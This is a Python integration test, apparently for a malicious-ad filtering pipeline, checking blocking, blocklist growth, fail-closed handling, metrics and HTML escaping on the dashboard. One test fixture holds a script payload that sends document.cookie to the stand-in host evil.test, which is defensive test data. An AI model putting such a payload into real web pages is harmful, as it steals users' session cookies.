"""Интеграционный тест: сквозная цепочка collector -> analyzer -> response -> alert (Flask test client)."""
import copy
import unittest

from common.config import DEFAULT
from services.analyzer_detector.app import create_app as mk_analyzer
from services.content_collector.app import create_app as mk_collector
from services.response_block.app import create_app as mk_response
from services.visual_alert.app import create_app as mk_alert
from services.visual_alert.store import EventStore


class Pipeline(unittest.TestCase):
    def setUp(self):
        self.store = EventStore(":memory:")
        self.sent = []
        self.alert = mk_alert(store=self.store, notifier=lambda t: self.sent.append(t) or True).test_client()
        self.response = mk_response(post=lambda url, p: self.alert.post("/event", json=p).get_json(),
                                    cfg=copy.deepcopy(DEFAULT)).test_client()
        self.analyzer = mk_analyzer(post=lambda url, p: self.response.post("/decide", json=p).get_json(),
                                    cfg=copy.deepcopy(DEFAULT)).test_client()
        self.collector = mk_collector(post=lambda url, p: self.analyzer.post("/analyze", json=p).get_json()).test_client()

    def test_malicious_ad_blocked_end_to_end(self):
        r = self.collector.post("/ingest", json={"kind": "ad", "source": "http://evil.test/ad",
                                                  "content": '<script>new Image().src="http://evil.test/s?c="+document.cookie</script>'}).get_json()
        self.assertEqual(r["decision"], "BLOCK")
        self.assertIsNone(r["content"])
        self.assertEqual(len(self.store.last()), 1)
        self.assertEqual(len(self.sent), 1)               # уведомление отправлено

    def test_clean_ad_allowed_no_notification(self):
        r = self.collector.post("/ingest", json={"kind": "ad", "source": "https://ads.partner-trusted.local/a",
                                                  "content": "<p>Привет</p>"}).get_json()
        self.assertEqual(r["decision"], "ALLOW")
        self.assertEqual(self.sent, [])

    def test_blocklist_grows(self):
        self.collector.post("/ingest", json={"kind": "ad", "source": "http://evil2.test/ad", "content": "<script>1</script>"})
        self.assertIn("evil2.test", self.response.get("/blocklist").get_json())

    def test_bad_request_400(self):
        self.assertEqual(self.collector.post("/ingest", json={"kind": "weird", "content": "x"}).status_code, 400)

    def test_fail_closed_when_analyzer_down(self):
        def boom(url, p):
            raise ConnectionError("down")
        col = mk_collector(post=boom).test_client()
        r = col.post("/ingest", json={"kind": "ad", "content": "<p>x</p>"}).get_json()
        self.assertEqual(r["decision"], "BLOCK")
        self.assertIn("fail-closed", r["reason"])

    def test_metrics_exposed(self):
        self.collector.post("/ingest", json={"kind": "ad", "source": "http://evil.test/a", "content": "<script>1</script>"})
        m = self.analyzer.get("/metrics").get_data(as_text=True)
        self.assertIn('detections_total{kind="ad",verdict="MALICIOUS"} 1.0', m)
        self.assertIn("detection_latency_seconds_bucket", m)

    def test_dashboard_escapes_html(self):
        self.collector.post("/ingest", json={"kind": "ad", "source": "http://evil.test/<b>x</b>", "content": "<script>1</script>"})
        page = self.alert.get("/").get_data(as_text=True)
        self.assertNotIn("<b>x</b>", page)


if __name__ == "__main__":
    unittest.main()
